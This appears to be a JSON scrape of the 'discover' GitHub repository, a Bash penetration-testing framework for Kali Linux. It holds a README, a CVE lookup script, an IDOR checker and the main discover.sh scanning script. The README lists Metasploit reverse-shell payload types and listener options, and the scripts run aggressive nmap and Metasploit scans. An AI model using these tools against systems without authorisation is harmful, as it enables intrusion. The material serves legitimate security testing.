{
  "metadata": {
    "timestamp": 1736568234610,
    "page": 102,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjExMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "leebaird/discover",
      "stars": 3469,
      "defaultBranch": "main",
      "files": [
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.01953125,
          "content": ".idea/*\n__pycache__/"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 1.0556640625,
          "content": "The MIT License (MIT)\n\nCopyright (c) 2007-2017 Lee Baird\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in\nall copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\nTHE SOFTWARE.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 7.0361328125,
          "content": "```\nCustom bash scripts used to automate various penetration testing tasks including recon, scanning, \nenumeration, and malicious payload creation using Metasploit. For use with Kali Linux.\n```\n\n[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://github.com/leebaird/discover/blob/master/LICENSE)\n[![Rawsec's CyberSecurity Inventory](https://inventory.rawsec.ml/img/badges/Rawsec-inventoried-FF5050_flat.svg)](https://inventory.rawsec.ml/tools.html#discover)\n\n* [![Twitter Follow](https://img.shields.io/twitter/follow/discoverscripts.svg?style=social&label=Follow)](https://twitter.com/discoverscripts) Lee Baird @discoverscripts\n* [![Twitter Follow](https://img.shields.io/twitter/follow/jay_townsend1.svg?style=social&label=Follow)](https://twitter.com/jay_townsend1) Jay \"L1ghtn1ng\" Townsend @jay_townsend1\n* [![Twitter Follow](https://img.shields.io/twitter/follow/ninewires.svg?style=social&label=Follow)](https://twitter.com/ninewires) Jason Ashton @ninewires\n\n### Download, setup, and usage\n* Open a Terminal as a regular user.\n* git clone https://github.com/leebaird/discover /opt/discover/\n* Discover should be ran as from this location.\n* Some options require Discover to be ran as root (i.e., Update and all SCANNING).\n* cd /opt/discover/\n* sudo ./discover.sh\n* Select option 15 to update Kali Linux, Discover scripts, various tools, and the locate database before using the framework.\n\n\n```\nRECON\n1.  Domain\n2.  Person\n\nSCANNING\n3.  Generate target list\n4.  CIDR\n5.  List\n6.  IP, range, or URL\n7.  Rerun Nmap scripts and MSF aux\n\nWEB\n8.  Insecure direct object reference\n9.  Open multiple tabs in Firefox\n10. Nikto\n11. SSL\n\nMISC\n12. Parse XML\n13. Generate a malicious payload\n14. Start a Metasploit listener\n15. Update\n16. Exit\n```\n## RECON\n### Domain\n```\nRECON\n\n1.  Passive\n2.  Find registered domains\n3.  Previous menu\n```\n\nUses ARIN, DNSRecon, dnstwist, subfinder, sublist3r,\ntheHarvester, Metasploit, Whois, and multiple websites.\n\n* Acquire all free API keys for maximum results with theHarvester.\n* Add API keys to /home/kali/.theHarvester/api-keys.yaml\n\n### Person\n```\nRECON\n\nFirst name:\nLast name:\n```\n\n* Combines info from multiple websites.\n\n## SCANNING\n### Generate target list\n```\nSCANNING\n\n1.  ARP scan\n2.  Ping sweep\n3.  Previous menu\n```\n\n* Use different tools to create a target list including Angry IP Scanner, arp-scan, netdiscover, and Nmap pingsweep.\n\n### CIDR, List, IP, Range, or URL\n```\nType of scan:\n\n1.  External\n2.  Internal\n3.  Previous menu\n```\n\n* External scan will set the Nmap source port to 53 and the max-rrt-timeout to 1500ms.\n* Internal scan will set the Nmap source port to 88 and the max-rrt-timeout to 500ms.\n* Nmap is used to perform host discovery, port scanning, service enumeration, and OS identification.\n* Nmap scripts and Metasploit auxiliary modules are used for additional enumeration.\n* Addition tools: enum4linux, smbclient, and ike-scan.\n\n## WEB\n### Insecure direct object reference\n````\nUsing Burp, authenticate to a site, map & Spider, then log out.\nTarget > Site map > select the URL > right click > Copy URLs in\nthis host. Paste the results into a new file.\n\nEnter the location of your file:\n````\n\n### Open multiple tabs in Firefox\n```\nOpen multiple tabs in Firefox with:\n\n1.  List\n2.  Files in a directory\n3.  Directories in robots.txt\n4.  Previous menu\n```\n\nExamples:\n* A list containing multiple IPs and/or URLs.\n* You finished scanning multiple web sites with Nikto and want to open every htm report located in a directory.\n* Use wget to download a domain's robot.txt file, then open all of the directories.\n\n### Nikto\n```\nThis option cannot be ran as root.\n\nRun multiple instances of Nikto in parallel.\n\n1.  List of IPs\n2.  List of IP:port\n3.  Previous menu\n```\n### SSL\n```\nCheck for SSL certificate issues.\n\nList of IP:port.\n\n\nEnter the location of your file:\n```\n\n* Uses sslscan, sslyze, and Nmap to check for SSL/TLS certificate issues.\n\n\n## MISC\n### Parse XML\n```\nParse XML to CSV.\n\n1.  Burp (Base64)\n2.  Nessus (.nessus)\n3.  Nexpose (XML 2.0)\n4.  Nmap\n5.  Qualys\n6.  Previous menu\n```\n\n### Generate a malicious payload\n```\nMalicious Payloads\n\n1.   android/meterpreter/reverse_tcp         (.apk)\n2.   cmd/windows/reverse_powershell          (.bat)\n3.   java/jsp_shell_reverse_tcp (Linux)      (.jsp)\n4.   java/jsp_shell_reverse_tcp (Windows)    (.jsp)\n5.   java/shell_reverse_tcp                  (.war)\n6.   linux/x64/meterpreter_reverse_https     (.elf)\n7.   linux/x64/meterpreter_reverse_tcp       (.elf)\n8.   linux/x64/shell/reverse_tcp             (.elf)\n9.   osx/x64/meterpreter_reverse_https       (.macho)\n10.  osx/x64/meterpreter_reverse_tcp         (.macho)\n11.  php/meterpreter_reverse_tcp             (.php)\n12.  python/meterpreter_reverse_https        (.py)\n13.  python/meterpreter_reverse_tcp          (.py)\n14.  windows/x64/meterpreter_reverse_https   (multi)\n15.  windows/x64/meterpreter_reverse_tcp     (multi)\n16.  Previous menu\n```\n\n### Start a Metasploit listener\n```\nMetasploit Listeners\n\n1.   android/meterpreter/reverse_tcp\n2.   cmd/windows/reverse_powershell\n3.   java/jsp_shell_reverse_tcp\n4.   linux/x64/meterpreter_reverse_https\n5.   linux/x64/meterpreter_reverse_tcp\n6.   linux/x64/shell/reverse_tcp\n7.   osx/x64/meterpreter_reverse_https\n8.   osx/x64/meterpreter_reverse_tcp\n9.   php/meterpreter/reverse_tcp\n10.  python/meterpreter_reverse_https\n11.  python/meterpreter_reverse_tcp\n12.  windows/x64/meterpreter_reverse_https\n13.  windows/x64/meterpreter_reverse_tcp\n14.  Previous menu\n```\n\n### Update\n\n* Update Kali Linux, Discover scripts, various tools, and the locate database.\n\n# Troubleshooting\n\nSome users have reported being unable to use any options except for 3, 4, and 5. \nNothing happens when choosing other options (1, 2, 6, etc.).\n\n## Verify the download hash\n\nHash-based verification ensures that a file has not been corrupted by comparing the file's hash \nvalue to a previously calculated value. If these values match, the file is presumed to be unmodified.\n\n### macOS\n\n1. Open Terminal\n2. shasum -a 256 /path/to/file\n3. Compare the value to the checksum on the website.\n\n### Windows\n\n1. Open PowerShell\n2. Get-FileHash C:\\path\\to\\file\n3. Compare the value to the checksum on the website.\n\n## Running Kali on VirtualBox or Windows Subsystem for Linux (WSL)\n\nSome users have reported the fix is to use the VMware image instead of WSL. \n\nOther users have noticed issues when running a pre-made VirtualBox Kali image, instead of running the \nbare metal Kali ISO through VirtualBox. \n(https://www.kali.org/get-kali/#kali-bare-metal)\n\nIf you are unwilling or unable to use VMware Workstation to run Kali, we encourage you to try running \na Kali ISO as a Guest VM in VirtualBox.\n\n1. Download the bare metal ISO provided by Kali.\n2. Verify the ISO hash (see above).\n3. Start a new Kali VM within VirtualBox with the bare metal Kali ISO.\n\nThere will be some [basic installation instructions](https://www.kali.org/docs/installation/hard-disk-install/) \nyou will be required to fill out during the installation.\n\nNote: If you have problems accessing root after setting up a bare metal ISO, please refer to: \nhttps://linuxconfig.org/how-to-reset-kali-linux-root-password\n"
        },
        {
          "name": "config",
          "type": "tree",
          "content": null
        },
        {
          "name": "cve.sh",
          "type": "blob",
          "size": 0.943359375,
          "content": "#!/usr/bin/env bash\n\n# by Lee Baird (@discoverscripts)\n\n# Check if Firefox is running\nif pgrep firefox > /dev/null; then\n    echo\n    echo \"[!] Close Firefox before running script.\"\n    echo\n    exit 1\nfi\n\necho\necho\necho \"Search for info on a CVE.\"\necho\necho -n \"CVE: \"\nread -r CVE\necho\n\n# Check for a valid CVE\nif [[ ! $CVE =~ ^CVE-[0-9]{4}-[0-9]{4,6}$ ]]; then\n    echo\n    echo \"[!] Invalid format.\"\n    echo\n    exit 1\nfi\n\nurls=(\n    \"https://nvd.nist.gov/vuln/detail/$CVE\"\n    \"https://www.cvedetails.com/cve/$CVE\"\n    \"https://vulners.com/search?query=$CVE\"\n    \"https://www.tenable.com/cve/$CVE\"\n    \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=$CVE\"\n    \"https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=$CVE\"\n    \"https://www.google.com/search?q=%22$CVE%22+AND+exploit\"\n    \"https://www.rapid7.com/db/?q=$CVE&type=nexpose\"\n)\n\n# Open each URL in a new tab\nfor url in \"${urls[@]}\"; do\n    xdg-open \"$url\" &\n    sleep 2\ndone\n"
        },
        {
          "name": "directObjectRef.sh",
          "type": "blob",
          "size": 0.6826171875,
          "content": "#!/usr/bin/env bash\n\n# by Lee Baird (@discoverscripts)\n\nclear\nf_banner\n\necho -e \"${BLUE}Using Burp, authenticate to a site, map & Spider, then log out.${NC}\"\necho -e \"${BLUE}Target > Site map > select the URL > right click > Copy URLs in${NC}\"\necho -e \"${BLUE}this host. Paste the results into a new file.${NC}\"\n\nf_location\n\nwhile read -r i; do\n    curl -sk -w \"%{http_code} - %{url_effective} \\\\n\" \"$i\" -o /dev/null 2>&1 | tee -a tmp\ndone < \"$LOCATION\"\n\ncat tmp | sort -u > DirectObjectRef.txt\nmv DirectObjectRef.txt \"$HOME\"/data/DirectObjectRef.txt\nrm tmp\n\necho\necho \"$MEDIUM\"\necho\necho \"[*] Scan complete.\"\necho\necho -e \"The new report is located at ${YELLOW}$HOME/data/DirectObjectRef.txt${NC}\"\n"
        },
        {
          "name": "discover.sh",
          "type": "blob",
          "size": 18.099609375,
          "content": "#!/usr/bin/env bash\n\n# by Lee Baird (@discoverscripts)\n\n# Special thanks to:\n# Jay Townsend (@jay_townsend1) - everything, conversion from Backtrack to Kali\n# Jason Ashton (@ninewires) - Penetration Testers Framework (PTF) compatibility, bug crusher, and bash ninja\n#\n# Thanks to:\n# Ben Wood (@DilithiumCore) - regex master\n# Dave Klug - planning, testing, and bug reports\n# Jason Arnold (@jasonarnold) - original concept and planning, co-author of crack-wifi\n# John Kim - Python guru, bug smasher, and parsers\n# Eric Milam (@Brav0Hax) - total re-write using functions\n# Hector Portillo - report framework v3\n# Ian Norden (@iancnorden) - report framework v2\n# Martin Bos (@cantcomputer) - IDS evasion techniques\n# Matt Banick - original development\n# Numerous people on freenode IRC - #bash and #sed (e36freak)\n# Rob Dixon (@304geek) - report framework concept\n# Robert Clowser (@dyslexicjedi)- all things\n# Saviour Emmanuel - Nmap parser\n# Securicon, LLC. - for sponsoring development of parsers\n# Steve Copland - report framework v1\n# Arthur Kay (@arthurakay) - Python scripts\n# Brett Fitzpatrick (@brettfitz) - SQL query\n# Robleh Esa (@RoblehEsa) - SQL queries\n\n# OPSEC: change your default nmap user agent located on line 160 at /usr/share/nmap/nselib/http.lua\n###############################################################################################################################\n\nf_terminate(){\n    SAVE_DIR=$HOME/data/cancelled-$(date +%H:%M:%S)\n    mkdir -p \"$SAVE_DIR\"\n    echo\n    echo \"[!] Terminating.\"\n    echo\n    echo -e \"${YELLOW}Saving data to $SAVE_DIR.${NC}\"\n\n    cd \"$DISCOVER\"/\n    mv \"$NAME\" \"$SAVE_DIR\" 2>/dev/null\n    mv tmp* \"$SAVE_DIR\" 2>/dev/null\n\n    echo\n    echo \"[*] Saving complete.\"\n    echo\n    exit 1\n}\n\n# Catch process termination\ntrap f_terminate SIGHUP SIGINT SIGTERM\n\n###############################################################################################################################\n\n# Global variables\nCWD=$(pwd)\nDISCOVER=$(locate discover.sh | head -n1 | sed 's:/[^/]*$::')\nMYIP=$(ip addr | grep 'global' | grep -Eiv '(:|docker)' | cut -d '/' -f1 | awk '{print $2}')\nRUNDATE=$(date +%B' '%d,' '%Y)\nSIP='sort -n -u -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4'\n\nLARGE='==============================================================================================================================='\nMEDIUM='=================================================================='\nSMALL='========================================'\n\nBLUE='\\033[1;34m'\nRED='\\033[1;31m'\nYELLOW='\\033[1;33m'\nNC='\\033[0m'\n\n###############################################################################################################################\n\n# Export variables if needed\nexport CWD DISCOVER MYIP RUNDATE SIP\nexport LARGE MEDIUM SMALL\nexport BLUE RED YELLOW NC\n\n###############################################################################################################################\n\nf_banner(){\n    echo\n    echo -e \"${YELLOW}\n _____  ___  _____  _____  _____  _    _  _____  _____\n|     \\  |  |____  |      |     |  \\  /  |____  |____/\n|_____/ _|_ _____| |_____ |_____|   \\/   |_____ |    \\_\n\nBy Lee Baird${NC}\"\n    echo\n    echo\n}\n\nexport -f f_banner\n\n###############################################################################################################################\n\nf_check4root(){\n    if [ $EUID -ne 0 ]; then\n        echo\n        echo \"[!] This script must be ran as root.\"\n        echo\n        exit 1\n    fi\n}\n\n###############################################################################################################################\n\nf_error(){\n    echo\n    echo -e \"${RED}$SMALL${NC}\"\n    echo\n    echo -e \"${RED}[!] Invalid choice or entry.${NC}\"\n    echo\n    echo -e \"${RED}$SMALL${NC}\"\n    echo\n    exit 1\n}\n\nexport -f f_error\n\n###############################################################################################################################\n\nf_location(){\n    echo\n    echo -n \"Enter the location of your file: \"\n    read -r LOCATION\n\n    # Check for no answer\n    if [ -z \"$LOCATION\" ]; then\n        f_error\n    fi\n\n    # Check for wrong answer\n    if [ ! -f \"$LOCATION\" ]; then\n        f_error\n    fi\n}\n\nexport -f f_location\n\n###############################################################################################################################\n\nf_runlocally(){\n    if [ -z \"$DISPLAY\" ]; then\n        echo\n        echo -e \"${RED}$MEDIUM${NC}\"\n        echo\n        echo -e \"${RED}[!] This option must be ran locally.${NC}\"\n        echo\n        echo -e \"${RED}$MEDIUM${NC}\"\n        echo\n        exit 1\n    fi\n}\n\nexport -f f_runlocally\n\n###############################################################################################################################\n\nf_scanname(){\n    f_typeofscan\n\n    echo -e \"${YELLOW}[*] Warning: no spaces allowed${NC}\"\n    echo\n    echo -n \"Name of scan: \"\n    read -r NAME\n\n    # Validate scan name: only allow alphanumeric, dashes, and underscores\n    if ! [[ \"$NAME\" =~ ^[a-zA-Z0-9_-]+$ ]]; then\n        f_error\n    fi\n\n    mkdir -p \"$NAME\"\n    export NAME\n}\n\n###############################################################################################################################\n\nf_typeofscan(){\n    echo -e \"${BLUE}Type of scan: ${NC}\"\n    echo\n    echo \"1.  External\"\n    echo \"2.  Internal\"\n    echo \"3.  Previous menu\"\n    echo\n    echo -n \"Choice: \"\n    read -r CHOICE\n\n    case \"$CHOICE\" in\n        1)\n            echo\n            echo -e \"${YELLOW}[*] Setting the max probe round trip to 1.5s.${NC}\"\n            MAXRTT=1500ms\n            echo\n            echo \"$MEDIUM\"\n            echo\n            ;;\n        2)\n            echo\n            echo -e \"${YELLOW}[*] Setting the max probe round trip to 500ms.${NC}\"\n            MAXRTT=500ms\n            echo\n            echo \"$MEDIUM\"\n            echo\n            ;;\n        3) f_main ;;\n        *) f_error ;;\n    esac\n}\n\n###############################################################################################################################\n\nf_cidr(){\n    f_check4root\n    clear\n    f_banner\n    f_scanname\n\n    echo\n    echo \"Usage: 192.168.1.0/24\"\n    echo\n    echo -n \"CIDR: \"\n    read -r CIDR\n\n    # Check for no answer\n    if [ -z \"$CIDR\" ]; then\n        rm -rf \"$NAME\"\n        f_error\n    fi\n\n    # Check for a valid CIDR\n    SUB=$(echo \"$CIDR\" | cut -d '/' -f2)\n    MIN=8\n    MAX=32\n\n    if ! [[ \"$SUB\" =~ ^[0-9]+$ ]] || [[ \"$SUB\" -lt \"$MIN\" || \"$SUB\" -gt \"$MAX\" ]]; then\n        f_error\n    fi\n\n    echo \"$CIDR\" > tmp-list\n    LOCATION=tmp-list\n\n    echo\n    echo -n \"Do you have an exclusion list? (y/N) \"\n    read -r EXCLUDE\n\n    if [ \"$EXCLUDE\" == \"y\" ]; then\n        echo -n \"Enter the path to the file: \"\n        read -r EXCLUDEFILE\n\n        if [ -z \"$EXCLUDEFILE\" ]; then\n            f_error\n        fi\n\n        if [ ! -f \"$EXCLUDEFILE\" ]; then\n            f_error\n        fi\n    else\n        touch tmp\n        EXCLUDEFILE=tmp\n    fi\n\n    START=$(date +%r\\ %Z)\n    export START\n\n    f_scan\n    f_ports\n    \"$DISCOVER\"/nse.sh\n    f_run-metasploit\n    \"$DISCOVER\"/report.sh && exit\n}\n\n###############################################################################################################################\n\nf_list(){\n    f_check4root\n    clear\n    f_banner\n    f_scanname\n    f_location\n\n    touch tmp\n    EXCLUDEFILE=tmp\n\n    START=$(date +%r\\ %Z)\n    export START\n\n    f_scan\n    f_ports\n    \"$DISCOVER\"/nse.sh\n    f_run-metasploit\n    \"$DISCOVER\"/report.sh && exit\n}\n\n###############################################################################################################################\n\nf_single(){\n    f_check4root\n    clear\n    f_banner\n    f_scanname\n\n    echo\n    echo -n \"IP, range or URL: \"\n    read -r TARGET\n\n    # Check for no answer\n    if [ -z \"$TARGET\" ]; then\n        rm -rf \"$NAME\"\n        f_error\n    fi\n\n    echo \"$TARGET\" > tmp-target\n    LOCATION=tmp-target\n\n    touch tmp\n    EXCLUDEFILE=tmp\n\n    START=$(date +%r\\ %Z)\n    export START\n\n    f_scan\n    f_ports\n    \"$DISCOVER\"/nse.sh\n    f_run-metasploit\n    \"$DISCOVER\"/report.sh && exit\n}\n\n###############################################################################################################################\n\nf_scan(){\n    CUSTOM='1-1040,1050,1080,1099,1158,1344,1352,1414,1433,1521,1720,1723,1883,1911,1962,2049,2202,2375,2628,2947,3000,3031,3050,3260,3306,3310,3389,3500,3632,4369,4786,5000,5019,5040,5060,5432,5560,5631,5632,5666,5672,5850,5900,5920,5984,5985,6000,6001,6002,6003,6004,6005,6379,6666,7210,7634,7777,8000,8009,8080,8081,8091,8140,8222,8332,8333,8400,8443,8834,9000,9084,9100,9160,9600,9999,10000,10443,10809,11211,12000,12345,13364,19150,20256,27017,28784,30718,35871,37777,46824,49152,50000,50030,50060,50070,50075,50090,60010,60030'\n    FULL='1-65535'\n    UDP='53,67,123,137,161,407,500,523,623,1434,1604,1900,2302,2362,3478,3671,4800,5353,5683,6481,17185,31337,44818,47808'\n\n    echo\n    echo -n \"Perform full TCP port scan? (y/N) \"\n    read -r SCAN\n\n    if [ \"$SCAN\" == \"y\" ]; then\n        TCP=$FULL\n    else\n        TCP=$CUSTOM\n    fi\n\n    echo\n    echo -n \"Perform version detection? (y/N) \"\n    read -r VDETECTION\n\n    if [ \"$VDETECTION\" == \"y\" ]; then\n        S='sTV'\n        U='sUV'\n    else\n        S='sT'\n        U='sU'\n    fi\n\n    echo\n    echo -n \"Set scan delay. (0-5, enter for normal) \"\n    read -r DELAY\n\n    # Check for no answer\n    if [ -z \"$DELAY\" ]; then\n        DELAY='0'\n    fi\n\n    if [ \"$DELAY\" -lt 0 ] || [ \"$DELAY\" -gt 5 ]; then\n        f_error\n    fi\n\n    export DELAY\n\n    echo\n    echo -n \"Run matching Metasploit auxiliaries? (y/N) \"\n    read -r MSF\n\n    echo\n    echo \"$MEDIUM\"\n    echo\n\n    nmap --randomize-hosts -iL \"$LOCATION\" --excludefile \"$EXCLUDEFILE\" --privileged -n -PE -PS21-23,25,53,80,110-111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 -PU53,67-69,123,135,137-139,161-162,445,500,514,520,631,1434,1900,4500,49152 -\"$S\" -\"$U\" -p T:\"$TCP\",U:\"$UDP\" -O --osscan-guess --max-os-tries 1 --max-retries 2 --min-rtt-timeout 100ms --max-rtt-timeout \"$MAXRTT\" --initial-rtt-timeout 500ms --defeat-rst-ratelimit --min-rate 450 --max-rate 15000 --open --stats-every 30s --scan-delay \"$DELAY\" -oA \"$NAME\"/nmap\n\n    if grep -q '(0 hosts up)' \"$NAME\"/nmap.nmap; then\n        rm -rf \"$NAME\" tmp*\n        echo\n        echo \"$MEDIUM\"\n        echo\n        echo \"[*] Scan complete.\"\n        echo\n        echo -e \"${YELLOW}[*] No live hosts were found.${NC}\"\n        echo\n        exit\n    fi\n\n    # Clean up\n    grep -Eiv '(0000:|0010:|0020:|0030:|0040:|0050:|0060:|0070:|0080:|0090:|00a0:|00b0:|00c0:|00d0:|1 hop|closed|guesses|guessing|filtered|fingerprint|general purpose|initiated|latency|network distance|no exact os|no os matches|os cpe|please report|rttvar|scanned in|unreachable|warning)' \"$NAME\"/nmap.nmap | sed 's/Nmap scan report for //g' | sed '/^OS:/d' > \"$NAME\"/nmap.txt\n\n    grep -o '[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}' \"$NAME\"/nmap.nmap | $SIP > \"$NAME\"/hosts.txt\n    hosts=$(wc -l \"$NAME\"/hosts.txt | cut -d ' ' -f1)     # BUG: I don't think this is needed\n\n    grep 'open' \"$NAME\"/nmap.txt | grep -v 'WARNING' | awk '{print $1}' | sort -un > \"$NAME\"/ports.txt\n    grep 'tcp' \"$NAME\"/ports.txt | cut -d '/' -f1 > \"$NAME\"/ports-tcp.txt\n    grep 'udp' \"$NAME\"/ports.txt | cut -d '/' -f1 > \"$NAME\"/ports-udp.txt\n\n    grep 'open' \"$NAME\"/nmap.txt | grep -v 'really open' | awk '{for (i=4;i<=NF;i++) {printf \"%s%s\",sep, $i;sep=\" \"}; printf \"\\n\"}' | sed 's/^ //' | sort -u | sed '/^$/d' > \"$NAME\"/banners.txt\n\n    while read -r i; do\n        grep \" $i/open/tcp//appserv-http/\\| $i/open/tcp//http/\\| $i/open/tcp//http-alt/\\| $i/open/tcp//http-proxy/\\| $i/open/tcp//snet-sensor-mgmt/\\| $i/open/tcp//sun-answerbook/\\| $i/open/tcp//vnc-http/\\| $i/open/tcp//wbem-http/\\| $i/open/tcp//wsman/\" \"$NAME\"/nmap.gnmap |\n        sed -e 's/Host: //g' -e 's/ (.*//g' -e 's.^.http://.g' -e \"s/$/:$i/g\" | $SIP >> tmp\n        grep \" $i/open/tcp//compaq-https/\\| $i/open/tcp//https/\\| $i/open/tcp//https-alt/\\| $i/open/tcp//ssl|giop/\\| $i/open/tcp//ssl|http/\\| $i/open/tcp//tungsten-https/\\| $i/open/tcp//ssl|unknown/\\| $i/open/tcp//wsmans/\" \"$NAME\"/nmap.gnmap |\n        sed -e 's/Host: //g' -e 's/ (.*//g' -e 's.^.https://.g' -e \"s/$/:$i/g\" | $SIP >> tmp2\n    done < \"$NAME\"/ports-tcp.txt\n\n    sed 's/http:\\/\\///g' tmp > \"$NAME\"/http.txt\n    sed 's/https:\\/\\///g' tmp2 > \"$NAME\"/https.txt\n\n    # Remove all empty files\n    find \"$NAME\"/ -type f -empty -exec rm {} +\n}\n\n###############################################################################################################################\n\nf_ports(){\n    echo\n    echo \"$MEDIUM\"\n    echo\n    echo -e \"${BLUE}Locating high value ports.${NC}\"\n    echo \"     TCP\"\n    TCP_PORTS=\"13 19 21 22 23 25 37 69 70 79 80 102 110 111 119 135 139 143 389 433 443 445 465 502 512 513 514 523 524 548 554 563 587 623 631 636 771 831 873 902 993 995 998 1050 1080 1099 1158 1344 1352 1414 1433 1521 1720 1723 1883 1911 1962 2049 2202 2375 2628 2947 3000 3031 3050 3260 3306 3310 3389 3500 3632 4369 4786 5000 5019 5040 5060 5432 5560 5631 5632 5666 5672 5850 5900 5920 5984 5985 6000 6001 6002 6003 6004 6005 6379 6666 7210 7634 7777 8000 8009 8080 8081 8091 8140 8222 8332 8333 8400 8443 8834 9000 9084 9100 9160 9600 9999 10000 10443 10809 11211 12000 12345 13364 19150 20256 27017 28784 30718 35871 37777 46824 49152 50000 50030 50060 50070 50075 50090 60010 60030\"\n\n    for i in $TCP_PORTS; do\n        cat \"$NAME\"/nmap.gnmap | grep \"\\<$i/open/tcp\\>\" | cut -d ' ' -f2 | $SIP > \"$NAME\"/\"$i\".txt\n    done\n\n    if [ -f \"$NAME\"/523.txt ]; then\n        mv \"$NAME\"/523.txt \"$NAME\"/523-tcp.txt\n    fi\n\n    if [ -f \"$NAME\"/5060.txt ]; then\n        mv \"$NAME\"/5060.txt \"$NAME\"/5060-tcp.txt\n    fi\n\n    echo \"     UDP\"\n    UDP_PORTS=\"53 67 123 137 161 407 500 523 623 1434 1604 1900 2302 2362 3478 3671 4800 5353 5683 6481 17185 31337 44818 47808\"\n\n    for i in $UDP_PORTS; do\n        cat \"$NAME\"/nmap.gnmap | grep \"\\<$i/open/udp\\>\" | cut -d ' ' -f2 | $SIP > \"$NAME\"/\"$i\".txt\n    done\n\n    if [ -f \"$NAME\"/523.txt ]; then\n        mv \"$NAME\"/523.txt \"$NAME\"/523-udp.txt\n    fi\n\n    # Combine Apache HBase ports and sort\n    cat \"$NAME\"/60010.txt \"$NAME\"/60030.txt > tmp\n    $SIP tmp > \"$NAME\"/apache-hbase.txt\n\n    # Combine Bitcoin ports and sort\n    cat \"$NAME\"/8332.txt \"$NAME\"/8333.txt > tmp\n    $SIP tmp > \"$NAME\"/bitcoin.txt\n\n    # Combine DB2 ports and sort\n    cat \"$NAME\"/523-tcp.txt \"$NAME\"/523-udp.txt > tmp\n    $SIP tmp > \"$NAME\"/db2.txt\n\n    # Combine Hadoop ports and sort\n    cat \"$NAME\"/50030.txt \"$NAME\"/50060.txt \"$NAME\"/50070.txt \"$NAME\"/50075.txt \"$NAME\"/50090.txt > tmp\n    $SIP tmp > \"$NAME\"/hadoop.txt\n\n    # Combine NNTP ports and sort\n    cat \"$NAME\"/119.txt \"$NAME\"/433.txt \"$NAME\"/563.txt > tmp\n    $SIP tmp > \"$NAME\"/nntp.txt\n\n    # Combine SMTP ports and sort\n    cat \"$NAME\"/25.txt \"$NAME\"/465.txt \"$NAME\"/587.txt > tmp\n    $SIP tmp > \"$NAME\"/smtp.txt\n\n    # Combine X11 ports and sort\n    cat \"$NAME\"/6000.txt \"$NAME\"/6001.txt \"$NAME\"/6002.txt \"$NAME\"/6003.txt \"$NAME\"/6004.txt \"$NAME\"/6005.txt > tmp\n    $SIP tmp > \"$NAME\"/x11.txt\n\n    # Remove all empty files\n    find \"$NAME\"/ -type f -empty -exec rm {} +\n}\n\n###############################################################################################################################\n\nf_cleanup(){\n    grep -Eiv 'starting nmap|host is up|sf|:$|service detection performed|https' tmp | sed '/^Nmap scan report/{n;d}' | sed 's/Nmap scan report for/Host:/g' > tmp4\n}\n\nexport -f f_cleanup\n\n###############################################################################################################################\n\nf_run-metasploit(){\n    if [ \"$MSF\" == \"y\" ]; then\n        \"$DISCOVER\"/msf-aux.sh\n    fi\n}\n\n###############################################################################################################################\n\nf_enumerate(){\n    f_check4root\n    clear\n    f_banner\n    f_typeofscan\n\n    echo -n \"Enter the location of your previous scan: \"\n    read -r LOCATION\n\n    # Check for no answer\n    if [ -z \"$LOCATION\" ]; then\n        f_error\n    fi\n\n    # Check for wrong answer\n    if [ ! -d \"$LOCATION\" ]; then\n        f_error\n    fi\n\n    NAME=$LOCATION\n\n    echo\n    echo -n \"Set scan delay. (0-5, enter for normal) \"\n    read -r DELAY\n\n    # Check for no answer\n    if [ -z \"$DELAY\" ]; then\n        DELAY='0'\n    fi\n\n    if [ \"$DELAY\" -lt 0 ] || [ \"$DELAY\" -gt 5 ]; then\n        f_error\n    fi\n\n    export DELAY\n\n    \"$DISCOVER\"/nse.sh\n    echo\n    echo \"$MEDIUM\"\n    f_run-metasploit\n\n    echo\n    echo -e \"${BLUE}Stopping Postgres.${NC}\"\n    service postgresql stop\n\n    echo\n    echo \"$MEDIUM\"\n    echo\n    echo \"[*] Scan complete.\"\n    echo\n    echo -e \"The supporting data folder is located at ${YELLOW}$NAME${NC}\"\n    echo\n    exit\n}\n\n###############################################################################################################################\n\nf_main(){\n    clear\n    f_banner\n\n    if [ ! -d \"$HOME\"/data ]; then\n        mkdir -p \"$HOME\"/data\n    fi\n\n    echo -e \"${BLUE}RECON${NC}\"\n    echo \"1.  Domain\"\n    echo \"2.  Person\"\n    echo\n    echo -e \"${BLUE}SCANNING${NC}\"\n    echo \"3.  Generate target list\"\n    echo \"4.  CIDR\"\n    echo \"5.  List\"\n    echo \"6.  IP, range, or URL\"\n    echo \"7.  Rerun Nmap scripts and MSF aux\"\n    echo\n    echo -e \"${BLUE}WEB${NC}\"\n    echo \"8.  Insecure direct object reference\"\n    echo \"9.  Open multiple tabs in Firefox\"\n    echo \"10. Nikto\"\n    echo \"11. SSL\"\n    echo\n    echo -e \"${BLUE}MISC${NC}\"\n    echo \"12. Parse XML\"\n    echo \"13. Generate a malicious payload\"\n    echo \"14. Start a Metasploit listener\"\n    echo \"15. Update\"\n    echo \"16. Exit\"\n    